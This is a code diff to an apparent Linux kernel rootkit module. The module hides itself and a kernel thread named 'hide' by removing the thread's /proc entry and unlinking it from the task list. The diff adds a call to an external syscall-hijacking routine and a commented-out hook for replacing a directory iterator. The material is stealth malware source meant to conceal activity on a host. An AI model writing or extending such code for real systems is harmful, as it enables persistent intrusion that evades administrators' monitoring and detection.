@@ -8,10 +8,12 @@
 #include <linux/kobject.h>
 #include <linux/slab.h>
 #include <linux/proc_fs.h>
+#include <linux/fs.h>
 
 #define prev_task(p) \
 	list_entry_rcu((p)->tasks.prev, struct task_struct, tasks)
 
+extern void hijack_syscall(struct task_struct *task); 
 extern void remove_module(struct module *mod); 
 
 static void hide_module(void)
@@ -35,7 +37,7 @@ static void hide_task(struct task_struct *task)
 	sprintf(dir, "%d", pid); 
 	printk(KERN_INFO "------------PID = %s\n", dir); 
 	remove_proc_subtree(dir, NULL); 
-	remove_proc_entry(dir, NULL); 
+	hijack_syscall(task); 
 	list_del_rcu(&task->tasks); 
 }
 
@@ -68,6 +70,7 @@ static int __init hide_init(void)
 	thread = kthread_run(&print_kthreads, NULL, "hide");
 	hide_module(); 
 	hide_task(thread);
+	/* replace_iterate(); */
 	return 0;
 }
 
